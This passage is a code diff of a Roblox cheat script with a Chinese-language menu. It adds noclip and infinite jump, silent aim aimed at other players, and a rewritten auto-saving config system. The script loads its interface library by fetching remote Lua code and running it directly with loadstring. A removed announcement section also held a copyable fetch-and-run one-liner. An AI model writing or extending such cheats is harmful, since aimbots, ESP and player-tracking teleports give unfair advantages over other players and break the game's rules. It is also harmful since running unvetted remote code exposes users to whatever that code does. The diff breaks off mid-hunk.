@@ -1,4 +1,7 @@
+
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
 local UIS = game:GetService("UserInputService")
@@ -9,6 +12,7 @@ _G.G_FastAttackMode   = _G.G_FastAttackMode or "模式2(部分账号失效用)"
 _G.G_AttackMobs       = _G.G_AttackMobs ~= true
 _G.G_AttackPlayers    = _G.G_AttackPlayers ~= true
 _G.G_DragonGunM1      = _G.G_DragonGunM1 or false
+_G.G_M1FireInterval   = _G.G_M1FireInterval or 0.2
 _G.G_FruitM1          = _G.G_FruitM1 or false
 _G.G_AutoHaki         = _G.G_AutoHaki or false
 _G.G_AutoV3           = _G.G_AutoV3 or false
@@ -19,7 +23,9 @@ _G.G_translateSpeed   = _G.G_translateSpeed or 50
 _G.G_translateAccel   = _G.G_translateAccel or false
 _G.G_jumpHeight       = _G.G_jumpHeight or 50
 _G.G_jumpEnabled      = _G.G_jumpEnabled or false
+_G.G_InfiniteJump     = _G.G_InfiniteJump or false
 _G.G_Fly              = _G.G_Fly or false
+_G.G_Noclip           = _G.G_Noclip or false
 _G.G_ESPEnabled       = _G.G_ESPEnabled ~= false
 _G.G_ESP_Name         = _G.G_ESP_Name ~= false
 _G.G_ESP_Level        = _G.G_ESP_Level ~= false
@@ -58,15 +64,16 @@ _G.G_LockQuickPath    = _G.G_LockQuickPath ~= false
 _G.G_SpectatePlys     = _G.G_SpectatePlys or false
 
 _G.G_ServerRegion       = _G.G_ServerRegion or "Singapore"
-_G.G_HopPlayerRange     = _G.G_HopPlayerRange or "1-12"
-_G.G_HopBountyRange     = _G.G_HopBountyRange or "大于3m"
-_G.G_HopMinPlayers      = _G.G_HopMinPlayers or 1
-_G.G_HopMaxPlayers      = _G.G_HopMaxPlayers or 12
-_G.G_HopMinBounty       = _G.G_HopMinBounty or 3000001
-_G.G_HopMaxBounty       = _G.G_HopMaxBounty or 999999999
+_G.G_HopPlayerRange = _G.G_HopPlayerRange or "1-12"
+_G.G_HopBountyRange = _G.G_HopBountyRange or "大于3m"
+_G.G_HopMinPlayers = _G.G_HopMinPlayers or 1
+_G.G_HopMaxPlayers = _G.G_HopMaxPlayers or 12
+_G.G_HopMinBounty = _G.G_HopMinBounty or 3000001
+_G.G_HopMaxBounty = _G.G_HopMaxBounty or 999999999
 
 _G.G_SilentAimM1R   = _G.G_SilentAimM1R or false
 _G.G_SilentAimSkill = _G.G_SilentAimSkill or false
+_G.G_SilentAimSkills = _G.G_SilentAimSkills or {"M1 (普攻)", "Z", "X", "C", "V", "F", "R"}
 _G.G_SilentAimShowFOV = _G.G_SilentAimShowFOV or false
 _G.G_SilentAimFOV     = _G.G_SilentAimFOV or 100
 _G.G_SilentAimPart    = _G.G_SilentAimPart or "Head"
@@ -82,10 +89,207 @@ _G.G_LockHotkey              = _G.G_LockHotkey or false
 _G.G_LockHotkeyMode          = _G.G_LockHotkeyMode or "锁人1"
 _G.G_AutoSoru                = _G.G_AutoSoru or false
 
-_G.G_AutoLoadConfig   = _G.G_AutoLoadConfig or false
-_G.G_AutoSaveConfig   = _G.G_AutoSaveConfig or false
-_G.G_Theme            = _G.G_Theme or "Sakura"
+_G.G_Theme            = _G.G_Theme or "Light"
 _G.G_Language         = _G.G_Language or "中文"
+
+local ConfigKeys = {
+    "G_FastAttack",
+    "G_FastAttackMode",
+    "G_AttackMobs",
+    "G_AttackPlayers",
+    "G_DragonGunM1",
+    "G_M1FireInterval",
+    "G_FruitM1",
+    "G_AutoHaki",
+    "G_AutoV3",
+    "G_AutoV4",
+    "G_AutoFlee",
+    "G_AutoFleeHP",
+    "G_translateSpeed",
+    "G_translateAccel",
+    "G_jumpHeight",
+    "G_jumpEnabled",
+    "G_InfiniteJump",
+    "G_Fly",
+    "G_Noclip",
+    "G_ESPEnabled",
+    "G_ESP_Name",
+    "G_ESP_Level",
+    "G_ESP_Bounty",
+    "G_ESP_Fruit",
+    "G_ESP_Distance",
+    "G_ESP_HP",
+    "G_ESP_TextSize",
+    "G_ESP_Highlight",
+    "G_ESP_HighlightColor",
+    "G_currentZoom",
+    "G_DodgeNoCooldown",
+    "G_DashLengthEnabled",
+    "G_DashLength",
+    "G_RemoveLava",
+    "G_RemoveFog",
+    "G_RemoveAnim",
+    "G_RemoveGhostShip",
+    "G_WalkOnWater",
+    "G_spinEnabled",
+    "G_spinSpeed",
+    "G_AutoFpsLock",
+    "G_NoMove",
+    "G_TeleportOffsetX",
+    "G_TeleportOffsetY",
+    "G_TeleportOffsetZ",
+    "G_TeleportPredict",
+    "G_LockQuickPath",
+    "G_ServerRegion",
+    "G_HopPlayerRange",
+    "G_HopBountyRange",
+    "G_HopMinPlayers",
+    "G_HopMaxPlayers",
+    "G_HopMinBounty",
+    "G_HopMaxBounty",
+    "G_SilentAimM1R",
+    "G_SilentAimSkill",
+    "G_SilentAimSkills",
+    "G_SilentAimShowFOV",
+    "G_SilentAimFOV",
+    "G_SilentAimPart",
+    "G_SilentAimFOVThickness",
+    "G_SilentAimFOVTransparency",
+    "G_SilentAimTargetPlayers",
+    "G_SilentAimTargetMobs",
+    "G_SilentAimShowLine",
+    "G_SilentAimFOVMode",
+    "G_SilentAimTeamCheck",
+    "G_SilentAimMethod",
+    "G_LockHotkey",
+    "G_LockHotkeyMode",
+    "G_Theme",
+    "G_Language",
+}
+local ConfigDirty = false
+local ConfigSaving = false
+local ConfigReady = false
+local ConfigLoadedData = {}
+
+local function EnsureConfigFolder()
+    if typeof(isfolder) == "function" and typeof(makefolder) == "function" then
+        local dir = CONFIG_FILE:match("^(.-)/[^/]+$")
+        if dir and not isfolder(dir) then
+            makefolder(dir)
+        end
+        return true
+    end
+    return false
+end
+
+local function DeepCopy(value)
+    if type(value) ~= "table" then
+        return value
+    end
+    local copy = {}
+    for k, v in pairs(value) do
+        copy[k] = DeepCopy(v)
+    end
+    return copy
+end
+
+local function CollectConfig()
+    local data = {}
+    for _, key in ipairs(ConfigKeys) do
+        local value = _G[key]
+        if value ~= nil then
+            data[key] = DeepCopy(value)
+        end
+    end
+    return data
+end
+
+local function ApplyConfigData(data)
+    if type(data) ~= "table" then
+        return
+    end
+    for _, key in ipairs(ConfigKeys) do
+        if data[key] ~= nil then
+            _G[key] = DeepCopy(data[key])
+        end
+    end
+end
+
+local function SaveConfig(force)
+    if ConfigSaving then
+        return false
+    end
+    if not force and not ConfigDirty then
+        return false
+    end
+    if typeof(writefile) ~= "function" then
+        return false
+    end
+    ConfigSaving = true
+    local ok = pcall(function()
+        EnsureConfigFolder()
+        local payload = CollectConfig()
+        writefile(CONFIG_FILE, HttpService:JSONEncode(payload))
+    end)
+    if ok then
+        ConfigDirty = false
+    end
+    ConfigSaving = false
+    return ok
+end
+
+local function QueueSaveConfig()
+    if not ConfigReady then
+        return
+    end
+    ConfigDirty = true
+end
+
+local function SaveConfiguration()
+    QueueSaveConfig()
+end
+
+local function LoadConfig()
+    if typeof(readfile) ~= "function" or typeof(isfile) ~= "function" then
+        return false
+    end
+    if not isfile(CONFIG_FILE) then
+        return false
+    end
+    local ok, data = pcall(function()
+        return HttpService:JSONDecode(readfile(CONFIG_FILE))
+    end)
+    if not ok or type(data) ~= "table" then
+        return false
+    end
+    ConfigLoadedData = data
+    ApplyConfigData(data)
+    return true
+end
+
+LoadConfig()
+ConfigReady = true
+
+task.spawn(function()
+    local lastRaw = nil
+    while task.wait(1) do
+        if not ConfigReady then
+            continue
+        end
+        local ok, raw = pcall(function()
+            return HttpService:JSONEncode(CollectConfig())
+        end)
+        if ok and raw then
+            if raw ~= lastRaw then
+                lastRaw = raw
+                ConfigDirty = true
+            end
+        end
+        if ConfigDirty then
+            SaveConfig(true)
+        end
+    end
+end)
 
 local Translations = {
     ["中文"] = {},
@@ -107,16 +311,16 @@ local Translations = {
         ["攻击怪物(此页面所有功能)"] = "Attack Mobs (All features)",
         ["攻击玩家(此页面所有功能)"] = "Attack Players (All features)",
         ["枪械 m1"] = "Dragon Gun M1",
+        ["枪械 m1 发射间隔"] = "Gun M1 Fire Interval",
         ["果实m1"] = "Fruit M1",
         -- 主要功能
         ["移动速度"] = "Move Speed",
         ["加速开关"] = "Speed Boost",
         ["跳跃高度"] = "Jump Height",
         ["高跳开启"] = "High Jump",
+        ["无限跳跃"] = "Infinite Jump",
+        ["穿墙"] = "Noclip",
         ["飞行"] = "Fly",
-        ["移动辅助"] = "Movement Assist",
-        ["自动瞬步"] = "Auto Soru",
-        ["每15秒强制打你2500血你气不气😂"] = "Forces 2,500 damage every 15 seconds 😂",
         ["自动武装色"] = "Auto Haki",
         ["自动 V3"] = "Auto V3",
         ["自动 V4"] = "Auto V4",
@@ -152,74 +356,16 @@ local Translations = {
         -- 服务器
         ["重进服务器"] = "Rejoin Server",
         ["选择服务器区域"] = "Select Server Region",
-        ["选择人数"] = "Player Count",
-        ["跳服时过滤人数范围"] = "Filter server hop by player count",
-        ["选择赏金"] = "Bounty Range",
-        ["跳服时过滤赏金范围"] = "Filter server hop by bounty",
-        ["人数设置"] = "Player Count",
-        ["赏金设置"] = "Bounty Range",
-        ["人数: "] = "Players: ",
-        ["赏金: "] = "Bounty: ",
-        ["匹配到服务器"] = "Matching Server Found",
-        ["尝试跳服"] = "Attempting server hop",
-        ["地区: "] = "Region: ",
         ["跳服"] = "Server Hop",
         ["服务器id"] = "Server ID",
         ["输入服务器id"] = "Enter Server ID",
         ["加入服务器 id"] = "Join Server ID",
-        ["复制服务器 ID"] = "Copy Server ID",
         -- 设置
         ["选择主题"] = "Select Theme",
-        ["自动保存配置"] = "Auto Save Config",
-        ["进游戏自动加载配置"] = "Auto Load Config",
+        ["自动保存已开启"] = "Auto Save On",
         ["保存配置"] = "Save Config",
         ["加载配置"] = "Load Config",
         ["窗口切换键"] = "Toggle Window Key",
-        ["配置"] = "Configuration",
-        ["外观"] = "Appearance",
-        ["主题"] = "Theme",
-        ["公告"] = "Announcements",
-        ["DC 服务器"] = "Discord Server",
-        ["点击复制 DC 链接"] = "Copy Discord Link",
-        ["已复制 DC 链接"] = "Discord link copied",
-        ["声明"] = "Statement",
-        ["Rayfield ui版脚本链接"] = "Rayfield UI Script Link",
-        ["点击复制"] = "Copy",
-        ["已复制链接"] = "Link copied",
-        ["脚本链接"] = "Script Links",
-        ["此脚本完全免费开源 禁止拿去圈钱"] = "This script is completely free and open source. Reselling is prohibited.",
-        ["当前执行器不支持复制到剪贴板"] = "The current executor does not support clipboard access",
-        ["切换主题时所有现有控件都会实时更新"] = "All existing controls update immediately when switching themes",
-        ["与传送页面的目标玩家保持同步"] = "Synced with the target player on the teleport page",
-        ["用于观战、传送和玩家目标功能"] = "Used by spectate, teleport, and player targeting",
-        ["内置主题（十三套）"] = "Built-in Themes (13)",
-        ["选择后立即应用，不会重建窗口"] = "Applies instantly without rebuilding the window",
-        ["午夜"] = "Midnight",
-        ["深海"] = "Ocean",
-        ["紫罗兰"] = "Violet",
-        ["翡翠"] = "Emerald",
-        ["琥珀"] = "Amber",
-        ["玫瑰"] = "Rose",
-        ["绯红"] = "Crimson",
-        ["北境"] = "Nord",
-        ["赛博"] = "Cyber",
-        ["明亮"] = "Light",
-        ["樱花"] = "Sakura",
-        ["拿铁"] = "Latte",
-        ["高对比"] = "High Contrast",
-        ["深色中性配色"] = "Neutral dark palette",
-        ["蓝色深海配色"] = "Deep ocean blue palette",
-        ["紫色强调配色"] = "Purple accent palette",
-        ["清爽绿色配色"] = "Fresh green palette",
-        ["温暖金色配色"] = "Warm golden palette",
-        ["柔和粉色配色"] = "Soft pink palette",
-        ["浓郁红色配色"] = "Rich red palette",
-        ["冷静低饱和配色"] = "Calm low-saturation palette",
-        ["高亮青色配色"] = "Bright cyan palette",
-        ["浅色界面配色"] = "Light interface palette",
-        ["浅粉色界面配色"] = "Light pink palette",
-        ["温和米色配色"] = "Warm beige palette",
-        ["强调可读性的配色"] = "High-readability palette",
         -- 传送
         ["选择目标玩家"] = "Select Target Player",
         ["刷新玩家列表"] = "Refresh Player List",
@@ -228,8 +374,6 @@ local Translations = {
         ["直接传送至玩家"] = "Direct TP to Player",
         ["锁人2"] = "Lock 2",
         ["锁人预判 (对抗飞行)"] = "Lock Predict (Anti-Fly)",
-        ["锁人快捷路径"] = "Lock Quick Path",
-        ["通过传送点快速接近目标"] = "Quickly approach target via TP points",
         ["X轴偏移"] = "X Offset",
         ["Y轴偏移"] = "Y Offset",
         ["Z轴偏移"] = "Z Offset",
@@ -242,6 +386,7 @@ local Translations = {
         ["自瞄设置"] = "Aimbot Settings",
         ["M1 自瞄"] = "M1 Aimbot",
         ["技能自瞄"] = "Skill Aimbot",
+        ["指定技能自瞄"] = "Aimbot Skills",
         ["瞄准玩家"] = "Target Players",
         ["瞄准 NPC"] = "Target NPCs",
         ["团队检测"] = "Team Check",
@@ -287,6 +432,13 @@ local Translations = {
         ["锁人2关闭"] = "Lock 2 Stopped",
         ["已停止锁定目标"] = "Stopped locking target",
         ["快捷传送点"] = "Quick TP Point",
+        ["锁人快捷路径"] = "Lock Quick Path",
+        ["通过传送点快速接近目标"] = "Quickly approach target via TP points",
+        ["公告"] = "Announcement",
+        ["DC 服务器"] = "DC Server",
+        ["点击复制 DC 链接"] = "Click to copy DC link",
+        ["已复制 DC 链接"] = "DC link copied",
+        ["宣传图"] = "Banner",
         -- 语言切换
         ["语言"] = "Language",
         ["中文"] = "Chinese",
@@ -305,412 +457,57 @@ local function L(text)
     return text
 end
 
-local EnglishTranslationSources = {}
-for source, translation in pairs(Translations["English"]) do
-    if EnglishTranslationSources[translation] == nil then
-        EnglishTranslationSources[translation] = source
-    end
-end
-
-local function LocalizeExistingText(text)
-    if type(text) ~= "string" or text == "" then
-        return text
-    end
-    return L(EnglishTranslationSources[text] or text)
-end
-
-local function ValidDropdownValue(values, value, fallback)
-    for _, option in ipairs(values) do
-        if option == value then
-            return value
-        end
-    end
-    return fallback
-end
-
-local function CollectConfig()
-    return {
-        Attack = {
-            FastAttack     = _G.G_FastAttack,
-            FastAttackMode = _G.G_FastAttackMode,
-            AttackMobs     = _G.G_AttackMobs,
-            AttackPlayers  = _G.G_AttackPlayers,
-            DragonGunM1    = _G.G_DragonGunM1,
-            FruitM1        = _G.G_FruitM1,
-        },
-        Auto = {
-            AutoHaki = _G.G_AutoHaki,
-            AutoV3   = _G.G_AutoV3,
-            AutoV4   = _G.G_AutoV4,
-            AutoFlee = _G.G_AutoFlee,
-            AutoFleeHP = _G.G_AutoFleeHP,
-        },
-        Main = {
-            translateSpeed   = _G.G_translateSpeed,
-            translateAccel   = _G.G_translateAccel,
-            jumpHeight       = _G.G_jumpHeight,
-            jumpEnabled      = _G.G_jumpEnabled,
-            Fly              = _G.G_Fly,
-            AutoSoru         = _G.G_AutoSoru,
-        },
-        ESP = {
-            ESPEnabled   = _G.G_ESPEnabled,
-            ESP_Name     = _G.G_ESP_Name,
-            ESP_Level    = _G.G_ESP_Level,
-            ESP_Bounty   = _G.G_ESP_Bounty,
-            ESP_Fruit    = _G.G_ESP_Fruit,
-            ESP_Distance = _G.G_ESP_Distance,
-            ESP_HP       = _G.G_ESP_HP,
-            ESP_TextSize = _G.G_ESP_TextSize,
-            ESP_Highlight = _G.G_ESP_Highlight,
-            ESP_HighlightColor = _G.G_ESP_HighlightColor,
-        },
-        Misc = {
-            currentZoom         = _G.G_currentZoom,
-            DodgeNoCooldown     = _G.G_DodgeNoCooldown,
-            DashLengthEnabled   = _G.G_DashLengthEnabled,
-            DashLength          = _G.G_DashLength,
-            RemoveLava      = _G.G_RemoveLava,
-            RemoveFog       = _G.G_RemoveFog,
-            RemoveAnim      = _G.G_RemoveAnim,
-            RemoveGhostShip = _G.G_RemoveGhostShip,
-            WalkOnWater     = _G.G_WalkOnWater,
-            spinEnabled     = _G.G_spinEnabled,
-            spinSpeed       = _G.G_spinSpeed,
-            AutoFpsLock     = _G.G_AutoFpsLock,
-            NoMove          = _G.G_NoMove,
-            TeleportOffsetX = _G.G_TeleportOffsetX,
-            TeleportOffsetY = _G.G_TeleportOffsetY,
-            TeleportOffsetZ = _G.G_TeleportOffsetZ,
-            TeleportPredict = _G.G_TeleportPredict,
-            LockQuickPath   = _G.G_LockQuickPath,
-        },
-        Server = {
-            ServerRegion = _G.G_ServerRegion,
-            HopPlayerRange = _G.G_HopPlayerRange,
-            HopBountyRange = _G.G_HopBountyRange,
-            HopMinPlayers = _G.G_HopMinPlayers,
-            HopMaxPlayers = _G.G_HopMaxPlayers,
-            HopMinBounty = _G.G_HopMinBounty,
-            HopMaxBounty = _G.G_HopMaxBounty,
-        },
-        Drawing = {
-            SilentAimM1R   = _G.G_SilentAimM1R,
-            SilentAimSkill = _G.G_SilentAimSkill,
-            SilentAimShowFOV = _G.G_SilentAimShowFOV,
-            SilentAimFOV     = _G.G_SilentAimFOV,
-            SilentAimPart    = _G.G_SilentAimPart,
-            SilentAimFOVThickness = _G.G_SilentAimFOVThickness,
-            SilentAimFOVTransparency = _G.G_SilentAimFOVTransparency,
-            SilentAimTargetPlayers = _G.G_SilentAimTargetPlayers,
-            SilentAimTargetMobs    = _G.G_SilentAimTargetMobs,
-            SilentAimShowLine      = _G.G_SilentAimShowLine,
-            SilentAimFOVMode       = _G.G_SilentAimFOVMode,
-            SilentAimTeamCheck     = _G.G_SilentAimTeamCheck,
-            SilentAimMethod        = _G.G_SilentAimMethod,
-            LockHotkey             = _G.G_LockHotkey,
-            LockHotkeyMode         = _G.G_LockHotkeyMode,
-        },
-        Setting = {
-            AutoLoadConfig = _G.G_AutoLoadConfig,
-            AutoSaveConfig = _G.G_AutoSaveConfig,
-        },
-        UI = {
-            Theme = _G.G_Theme,
-            Language = _G.G_Language
-        }
-    }
-end
-function SaveConfiguration()
-    local data = CollectConfig()
-    writefile(CONFIG_FILE, HttpService:JSONEncode(data))
-end
-function LoadConfiguration()
-    if not isfile(CONFIG_FILE) then return end
-    local data = HttpService:JSONDecode(readfile(CONFIG_FILE))
-    for section, values in pairs(data) do
-        for k, v in pairs(values) do
-            _G["G_" .. k] = v
-        end
-    end
-end
-pcall(LoadConfiguration)
-_G.G_FastAttackMode = ValidDropdownValue(
-    {"模式1", "模式2(部分账号失效用)"},
-    _G.G_FastAttackMode,
-    "模式2(部分账号失效用)"
-)
-_G.G_ServerRegion = ValidDropdownValue(
-    {"Oregon", "Florida", "Texas", "California", "Hong Kong", "Germany", "Brazil", "Singapore"},
-    _G.G_ServerRegion,
-    "Singapore"
-)
-_G.G_HopPlayerRange = ValidDropdownValue(
-    {"1-12", "3-12", "5-12", "7-12", "9-12"},
-    _G.G_HopPlayerRange,
-    "1-12"
-)
-_G.G_HopBountyRange = ValidDropdownValue(
-    {"大于3m", "大于5m", "大于10m", "大于15m", "大于25m", "大于35m", "大于50m"},
-    _G.G_HopBountyRange,
-    "大于3m"
-)
-_G.G_SilentAimPart = ValidDropdownValue(
-    {"HumanoidRootPart", "Head", "Torso", "UpperTorso", "LowerTorso"},
-    _G.G_SilentAimPart,
-    "Head"
-)
-_G.G_LockHotkeyMode = ValidDropdownValue({"锁人1", "锁人2"}, _G.G_LockHotkeyMode, "锁人1")
-_G.G_SilentAimMethod = ValidDropdownValue(
-    {"鼠标最近的玩家", "最近的玩家", "选择玩家"},
-    _G.G_SilentAimMethod,
-    "鼠标最近的玩家"
-)
-_G.G_SilentAimFOVMode = ValidDropdownValue({"跟随鼠标", "屏幕中心"}, _G.G_SilentAimFOVMode, "跟随鼠标")
-_G.FOVMode = _G.G_SilentAimFOVMode
-local Velora = loadstring(game:HttpGet("https://raw.githubusercontent.com/kismile36/VeloraUI/main/Velora.lua"))()
-local VeloraUI = Velora.new({
-    Name = "RJR",
-    DestroyExisting = true,
-    Theme = _G.G_Theme,
-    ToggleKey = Enum.KeyCode.G,
-    Search = true,
-    OpenButton = {
-        Title = "RJR",
-        Icon = "",
-        Draggable = true,
-        OnlyIcon = false,
-        OnlyMobile = false,
-        Color = ColorSequence.new(
-            Color3.fromRGB(255, 68, 68),
-            Color3.fromRGB(255, 136, 0)
-        ),
-        CornerRadius = UDim.new(1, 0),
-        StrokeThickness = 3,
-    },
-})
-
-local WindUI = {}
-
-function WindUI:SetTheme(theme)
-    if not VeloraUI:GetThemes()[theme] then
-        theme = "Sakura"
-    end
-    _G.G_Theme = theme
-    return VeloraUI:SetTheme(theme)
-end
-
-function WindUI:GetCurrentTheme()
-    return VeloraUI:GetCurrentTheme()
-end
-
-function WindUI:GetThemes()
-    return VeloraUI:GetThemes()
-end
-
-function WindUI:Notify(options)
-    return VeloraUI:Notify(options)
-end
-
-if not VeloraUI:GetThemes()[_G.G_Theme] then
-    _G.G_Theme = "Sakura"
+_G.FOVMode = _G.G_SilentAimFOVMode or "跟随鼠标"
+local WindUI = loadstring(request({
+    Url = "https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"
+}).Body)()
+local availableThemesCheck = WindUI:GetThemes()
+if not availableThemesCheck[_G.G_Theme] then
+    _G.G_Theme = "Dark"
 end
 WindUI:SetTheme(_G.G_Theme)
-
-local Window = VeloraUI:CreateWindow({
+local Window = WindUI:CreateWindow({
     Title = L("人挤人中心"),
-    Subtitle = "by kismie",
     Icon = "",
-    Size = UDim2.fromOffset(740, 520),
-    MinSize = Vector2.new(620, 420),
-    SidebarWidth = 170,
-    Resizable = true,
-    Search = true,
-    ShowUser = false,
+    Author = "by kismile",
+    Folder = "WindUI",
+    Size = UDim2.fromOffset(580, 460),
+    Transparent = true,
     Theme = _G.G_Theme,
+    Acrylic = false,
+    HideSearchBar = false,
+    SideBarWidth = 200,
+    OpenButton = {
+        Title = "RJR",
+        CornerRadius = UDim.new(1, 0),
+        StrokeThickness = 3,
+        Enabled = true,
+        OnlyMobile = false,
+        Draggable = true,
+        OnlyIcon = false,
+        Color = ColorSequence.new(
+            Color3.fromHex("#FF4444"),
+            Color3.fromHex("#FF8800")
+        ),
+    },
     ToggleKey = Enum.KeyCode.G,
 })
-
-local function createSection(tab, title, side, description)
-    local section = tab:AddSection({
-        Title = title,
-        Description = description or "",
-        Side = side,
-        Collapsible = true,
-    })
-    function section:Section(options)
-        options = options or {}
-        return createSection(
-            tab,
-            options.Title or options.Name or "Section",
-            options.Side,
-            options.Description or options.Desc
-        )
-    end
-    return section
-end
-
-local AnnouncementTab = Window:AddTab({ Title = L("公告"), Icon = "megaphone" })
-local CombatTab = Window:AddTab({ Title = L("主要功能"), Icon = "sword" })
-local VisualTab = Window:AddTab({ Title = L("绘制"), Icon = "eye" })
-local MovementTab = Window:AddTab({ Title = L("传送"), Icon = "navigation" })
-local UtilityTab = Window:AddTab({ Title = L("杂项"), Icon = "grid" })
-local SettingsTab = Window:AddTab({ Title = L("设置"), Icon = "settings" })
-
-local AppearanceSection = createSection(
-    SettingsTab,
-    L("主题"),
-    "Left",
-    L("切换主题时所有现有控件都会实时更新")
-)
-local ConfigSection = createSection(SettingsTab, L("配置") .. " / " .. L("语言"), "Right")
-local AnnouncementLinksSection = createSection(AnnouncementTab, L("脚本链接"), "Right")
-local VisualTargetSection = createSection(
-    VisualTab,
-    L("选择目标玩家"),
-    "Left",
-    L("与传送页面的目标玩家保持同步")
-)
-local RJR = {
-    [L("公告")] = createSection(AnnouncementTab, L("公告"), "Left"),
-    [L("主要功能")] = createSection(CombatTab, L("主要功能"), "Left"),
-    [L("杀戮光环")] = createSection(CombatTab, L("杀戮光环"), "Right"),
-    ["ESP"] = createSection(VisualTab, "ESP", "Left"),
-    [L("绘制")] = createSection(VisualTab, L("FOV"), "Right"),
-    [L("传送")] = createSection(MovementTab, L("传送"), "Left"),
-    [L("杂项")] = createSection(MovementTab, L("杂项"), "Right"),
-    [L("商店")] = createSection(UtilityTab, L("商店"), "Left"),
-    [L("服务器")] = createSection(UtilityTab, L("服务器"), "Right"),
-    [L("设置")] = AppearanceSection,
+local Tabs = {
+    [L("主要功能")] = Window:Section({ Title = L("主要功能"), Opened = true }),
+    [L("设置")] = Window:Section({ Title = L("设置"), Opened = true }),
 }
-local AutoSoruSection = createSection(CombatTab, L("移动辅助"), "Right")
-
-local LanguageButton
-local ThemeDropdown
-local RefreshDynamicLanguageUI
-
-local function RefreshLocalizedUI()
-    Window:SetTitle(LocalizeExistingText(Window.Options.Title), LocalizeExistingText(Window.Options.Subtitle))
-    for _, tab in ipairs(Window._tabs) do
-        tab.Options.Description = LocalizeExistingText(tab.Options.Description)
-        tab:SetTitle(LocalizeExistingText(tab.Title))
-        for _, section in ipairs(tab._sections) do
-            local title = LocalizeExistingText(section.Title)
-            if section == ConfigSection then
-                title = L("配置") .. " / " .. L("语言")
-            end
-            section:SetTitle(title, LocalizeExistingText(section.Description))
-            for _, control in ipairs(section._controls) do
-                if control.Type == "Paragraph" then
-                    local value = control:Get()
-                    local paragraphTitle = LocalizeExistingText(value.Title)
-                    local paragraphContent = LocalizeExistingText(value.Content)
-                    control:Set({
-                        Title = paragraphTitle,
-                        Content = paragraphContent,
-                    }, {
-                        Silent = true,
-                        Force = true,
-                        Source = "language",
-                    })
-                    control.Title = paragraphTitle
-                    control.Description = paragraphContent
-                    if control._searchEntry then
-                        VeloraUI:_refreshSearchItem(control._searchEntry, paragraphTitle, paragraphContent)
-                    end
-                elseif control.Type == "Label" then
-                    local labelText = LocalizeExistingText(control:Get())
-                    control:Set(labelText, {
-                        Silent = true,
-                        Force = true,
-                        Source = "language",
-                    })
-                    control.Title = labelText
-                    if control._searchEntry then
-                        VeloraUI:_refreshSearchItem(control._searchEntry, labelText, "")
-                    end
-                else
-                    control:SetTitle(LocalizeExistingText(control.Title))
-                    if control.Description ~= "" then
-                        control:SetDescription(LocalizeExistingText(control.Description))
-                    end
-                end
-                if control.Values then
-                    local choicesChanged = false
-                    for _, choice in ipairs(control.Values) do
-                        if type(choice.Value) == "string" and Translations["English"][choice.Value] then
-                            choice.Title = L(choice.Value)
-                            choicesChanged = true
-                        end
-                    end
-                    if choicesChanged and control._render then
-                        control:_render(control:Get())
-                    end
-                end
-            end
-        end
-    end
-    if LanguageButton then
-        local languageName = _G.G_Language == "English" and "English" or "中文"
-        LanguageButton:SetTitle(L("语言") .. " (" .. languageName .. ")")
-    end
-    if ThemeDropdown and ThemeDropdown.Values then
-        for _, choice in ipairs(ThemeDropdown.Values) do
-            choice.Title = LocalizeExistingText(choice.Title)
-            choice.Description = LocalizeExistingText(choice.Description)
-        end
-        ThemeDropdown:_render(ThemeDropdown:Get())
-    end
-    if RefreshDynamicLanguageUI then
-        RefreshDynamicLanguageUI()
-    end
-end
-
-local DiscordLink = "https://discord.gg/862SZpM7Qk"
-local RayfieldScript = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/kismile36/g1/refs/heads/main/RJR_rayfileld"))()]]
-
-local function CopyAnnouncementText(text, successMessage)
-    local copied = type(setclipboard) == "function" and pcall(setclipboard, text)
-    WindUI:Notify({
-        Title = copied and L("复制成功") or L("操作失败"),
-        Content = copied and successMessage or L("当前执行器不支持复制到剪贴板"),
-        Duration = 2,
-    })
-end
-
-RJR[L("公告")]:Paragraph({
-    Title = L("DC 服务器"),
-    Desc = DiscordLink,
-})
-
-RJR[L("公告")]:Button({
-    Title = L("点击复制 DC 链接"),
-    ActionText = L("点击复制"),
-    Callback = function()
-        CopyAnnouncementText(DiscordLink, L("已复制 DC 链接"))
-    end,
-})
-
-RJR[L("公告")]:Divider()
-
-RJR[L("公告")]:Paragraph({
-    Title = L("声明"),
-    Desc = L("此脚本完全免费开源 禁止拿去圈钱"),
-})
-
-AnnouncementLinksSection:Paragraph({
-    Title = L("Rayfield ui版脚本链接"),
-    Desc = RayfieldScript,
-})
-
-AnnouncementLinksSection:Button({
-    Title = L("点击复制"),
-    ActionText = L("点击复制"),
-    Callback = function()
-        CopyAnnouncementText(RayfieldScript, L("已复制链接"))
-    end,
-})
-
+local RJR = {
+    [L("公告")]     = Tabs[L("主要功能")]:Tab({ Title = L("公告"), Icon = "bell" }),
+    [L("主要功能")] = Tabs[L("主要功能")]:Tab({ Title = L("主要功能"), Icon = "zap" }),
+    [L("杀戮光环")] = Tabs[L("主要功能")]:Tab({ Title = L("杀戮光环"), Icon = "sword" }),
+    ["ESP"]     = Tabs[L("主要功能")]:Tab({ Title = "ESP", Icon = "eye" }),
+    [L("绘制")]     = Tabs[L("主要功能")]:Tab({ Title = L("FOV"), Icon = "pen-tool" }),
+    [L("传送")]     = Tabs[L("主要功能")]:Tab({ Title = L("传送"), Icon = "users" }),
+    [L("杂项")]     = Tabs[L("主要功能")]:Tab({ Title = L("杂项"), Icon = "list" }),
+    [L("商店")]     = Tabs[L("主要功能")]:Tab({ Title = L("商店"), Icon = "shopping-cart" }),
+    [L("服务器")]   = Tabs[L("设置")]:Tab({ Title = L("服务器"), Icon = "server" }),
+    [L("设置")]     = Tabs[L("设置")]:Tab({ Title = L("设置"), Icon = "settings" }),
+}
 local function IsAlive(character)
     if not character then return false end
     local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -890,6 +687,10 @@ local function PerformAttack()
 end
 task.spawn(function()
     while true do
+        if not _G.G_FastAttack then
+            task.wait(0.3)
+            continue
+        end
         local startTime = tick()
         pcall(PerformAttack)
         if _G.G_FastAttackMode == "模式1" then
@@ -913,7 +714,7 @@ RJR[L("杀戮光环")]:Toggle({
 RJR[L("杀戮光环")]:Dropdown({
     Title = L("快速攻击模式"),
     Values = {"模式1", "模式2(部分账号失效用)"},
-    Value = ValidDropdownValue({"模式1", "模式2(部分账号失效用)"}, _G.G_FastAttackMode, "模式2(部分账号失效用)"),
+    Value = _G.G_FastAttackMode,
     Callback = function(v)
         _G.G_FastAttackMode = v
